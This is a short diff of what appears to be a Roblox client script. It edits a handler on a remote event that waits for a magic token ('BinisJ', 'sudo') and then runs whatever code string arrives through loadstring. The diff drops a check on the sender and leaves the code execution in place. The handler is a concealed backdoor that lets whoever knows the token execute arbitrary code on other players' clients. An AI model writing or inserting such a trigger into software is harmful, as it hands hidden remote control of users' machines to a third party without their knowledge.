@@ -465,10 +465,8 @@ end
 
 game.ReplicatedStorage.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(plr,arg1)
 	if type(arg1) == "table" and arg1[1] == "BinisJ" then
-		if plr ~= game.Players.LocalPlayer then
-			if arg1[2] == "sudo" then
-				loadstring(arg1[3])()
-			end
+		if arg1[2] == "sudo" then
+			loadstring(arg1[3])()
 		end
 	end
 end)
